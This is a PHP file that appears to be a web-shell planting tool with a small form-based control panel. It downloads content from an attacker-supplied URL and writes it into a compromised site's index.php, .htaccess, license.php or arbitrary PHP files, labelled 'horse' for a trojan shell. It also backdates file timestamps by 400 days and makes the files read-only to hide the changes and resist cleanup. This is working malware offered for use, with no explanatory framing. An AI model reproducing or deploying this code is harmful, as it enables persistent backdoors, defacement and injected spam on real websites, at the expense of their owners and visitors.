<?php
	header('Content-Type: text/html; charset=utf-8');
    $docUrl = @$_SERVER['DOCUMENT_ROOT'];
    $htUrl = $docUrl.'/.htaccess';
    $fileName = '/license.php';
    $indexName =  $docUrl.'/index.php';
    $fileNameUrl = isset($_GET['filename']) ? $_GET['filename'] : '';
    $erName = isset($_GET['ername']) ? $_GET['ername'] : '';
    $getFileContent = @file_get_contents($fileNameUrl);
    if (!empty($getFileContent)) {
        if(!empty($erName)) {
            if(!preg_match('/(\.php)$/i', $erName)){
                echo 'er file must .php!';
                exit;
            }
            if($erName == 'index.php') {
                $handle = @fopen($indexName, "r");
                $contents = @fread($handle, @filesize ($indexName));
                @fclose($handle);
                $a = preg_match_all('/<\?php[\S\s]*?\?>|<\?php[\S\s]*/i', $contents, $mc);
                $h = preg_match_all('/[<]html[\s\S]*?[<][\/]html>/i', $contents, $hc);
                if ($a >=1&&empty($h)) {
                    $contents = $mc[0][$a-1];
                }
                if ($h>=1) {
                    $contents = $hc[0][$h-1];
                }
                if (strstr($contents,'%71%77%65%72%74%79%75%69%6f%70%61%73%64%66')) {
                    $contents = '';
                }
                $htmlContent = $getFileContent.$contents;
                @unlink($indexName);
                @touch($indexName, strtotime("-400 days", time()));
                $putRes = @file_put_contents($indexName,$htmlContent);
				if (!empty($putRes)) {
					echo $indexName.'=>success'."<br>";
					@chmod($indexName, 0444);
				} else {
					echo $indexName.'=>fail'."<br>";		
				}
                exit;
            }
            $putRes = @file_put_contents($docUrl.'/'.$erName,$getFileContent);
			if (!empty($putRes)) {
				echo $docUrl.'/'.$erName.'=>success'."<br>";
				@chmod($docUrl.'/'.$erName, 0444);
			} else {
				echo $docUrl.'/'.$erName.'=>fail'."<br>";			
			}
            exit;
        }
        if (strstr($fileNameUrl,'htaccess')) {
            @unlink($htUrl);
            @touch($htUrl, strtotime("-400 days", time()));
            $putRes = @file_put_contents($htUrl,$getFileContent);
			if (!empty($putRes)) {
				echo $fileNameUrl.'=>success'."<br>";
				@chmod($htUrl, 0444);
			} else {
				echo $fileNameUrl.'=>fail'."<br>";			
			}
            exit;
        } else {
            $putRes = @file_put_contents(__DIR__.'/license.php',$getFileContent);
			if (!empty($putRes)) {
				echo __DIR__.'/license.php'.'=>success'."<br>";
			} else {
				echo __DIR__.'/license.php'.'=>fail'."<br>";				
			}
            exit;
        }
        
    }
    
    if (!empty($_POST)) {
        $type = $_POST['type'];
        $fileNameUrl = $_POST['fileNameUrl'];
        $horseToIndex = isset($_POST['horseIndex']) ? $_POST['horseIndex'] : '';
        $secondName = isset($_POST['secondName']) ? $_POST['secondName'] : '';
        if (empty($type)) {
            echo '<script>alert("type is empty!");window.history.back();</script>';
            exit;
        }
        if (empty($fileNameUrl)) {
            echo '<script>alert("file path is empty!");window.history.back();</script>';
            exit;
        }

        $fileContent = @file_get_contents($fileNameUrl);
        /*horse*/
        if ($type == 1) {
            $newDir = __DIR__.'/plugins/';
            if (!is_dir($newDir)) {
                @mkdir($newDir,0775);
            }
            if($horseToIndex == 1) {
                if (!file_exists($newDir.'index.php')) {
                    @touch($newDir.'index.php');
                }
                @file_put_contents($newDir.'index.php',$fileContent);
                echo $newDir.'index.php'.'=>success'."<br>";
            }
			$putRes = @file_put_contents(__DIR__.$fileName,$fileContent);
			if (!empty($putRes)) {
				echo __DIR__.$fileName.'=>success'."<br>";
			} else {
				echo __DIR__.$fileName.'=>fail'."<br>";				
			}
            exit;
        }
        /*horse*/
        /*index*/
        if ($type == 2) {
            $handle = fopen($indexName, "r");
            $contents = fread($handle, filesize ($indexName));
            fclose($handle);
            $a = preg_match_all('/<\?php[\S\s]*?\?>|<\?php[\S\s]*/i', $contents, $mc);
            $h = preg_match_all('/[<]html[\s\S]*?[<][\/]html>/i', $contents, $hc);
            if ($a >=1&&empty($h)) {
                $contents = $mc[0][$a-1];
            }
            if ($h>=1) {
                $contents = $hc[0][$h-1];
            }
            if (strstr($contents,'%71%77%65%72%74%79%75%69%6f%70%61%73%64%66')) {
                $contents = '';
            }
            $htmlContent = $fileContent.$contents;
            @unlink($indexName);
            @touch($indexName, strtotime("-400 days", time()));
            $putRes = @file_put_contents($indexName,$htmlContent);
			if (!empty($putRes)) {
				echo $indexName.'=>success'."<br>";
				@chmod($indexName, 0444);
			} else {
				echo $indexName.'=>fail'."<br>";				
			}
            exit;
        }
        /*index*/
        /*ht*/
        if ($type == 3) {
            if (strstr($fileNameUrl,'htaccess')) {
                @unlink($htUrl);
                @touch($htUrl, strtotime("-400 days", time()));
                $putRes = @file_put_contents($htUrl,$fileContent);
				if (!empty($putRes)) {
					echo $htUrl.'=>success'."<br>";
					@chmod($htUrl, 0444);
				} else {
					echo $htUrl.'=>fail'."<br>";				
				}  
                exit;
            }
        }
        /*ht*/
        /*second*/
        if ($type == 4) {
            if(!preg_match('/(\.php)$/i', $secondName)){
                echo '<script>alert("er file must .php!");window.history.back();</script>';
                exit;
            }
            $putRes = @file_put_contents($docUrl.'/'.$secondName,$fileContent);
			if (!empty($putRes)) {
				echo $docUrl.'/'.$secondName.'=>success'."<br>";
				exit;
			} else {
				echo $docUrl.'/'.$secondName.'=>fail'."<br>";
				exit;					
			}
        }
        /*second*/

    }
?>
 <html>
     <head>
        <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
     	<script type="text/javascript">
            $(document).ready(function() {
            　　　// jquery change
                $('input[type=radio][name=type]').change(function() {
                    if (this.value == '1') {
                        $('.horse').show();
                        $('.second').hide();
                    }
                    else if (this.value == '4') {
                        $('.second').show();
                        $('.horse').hide();
                    } else {
                        $('.second').hide();
                        $('.horse').hide();
                    }
                });
            });
        </script>
        <style>
            .horse,.second{
                display: none;
            }
        </style>
     </head>
     <body>
        <form method="post" action="">
            <table align="center">
                <caption>xiaoxiannv</caption>
                <tr>
                    <td>type：</td>
                    <td>
                        <label>
                        <input type="radio" name="type" id="t2" value="2"checked><label for="t2">index</label>
                        <input type="radio" name="type" id="t1" value="1"><label for="t1">horse</label>
                        <input type="radio" name="type" id="t3" value="3"><label for="t3">.ht</label>
                        <input type="radio" name="type" id="t4" value="4"><label for="t4">.secondary documents</label>
                        </label>
                    </td>
                </tr>
                <tr class="horse">
                    <td>horse to index：</td>
                    <td>
                        <input type="radio" name="horseIndex" value="1">yes
                        <input type="radio" name="horseIndex" value="2" checked>no
                    </td>
                </tr>
                <tr class="second">
                    <td>secondName：</td>
                    <td>
                       <input type="text" name="secondName"/>
                    </td>
                </tr>
                <tr>
                    <td>file path：</td>
                    <td>
                       <input type="text" name="fileNameUrl" style="width:370;"/>
                    </td>
                </tr>
                <tr>
                    <td colspan="2" style="text-align: center; padding: 5px;">
                        <input type="submit" value="submit"/>
                    </td>
                </tr>
            </table>
        </form>
     </body>
 </html>
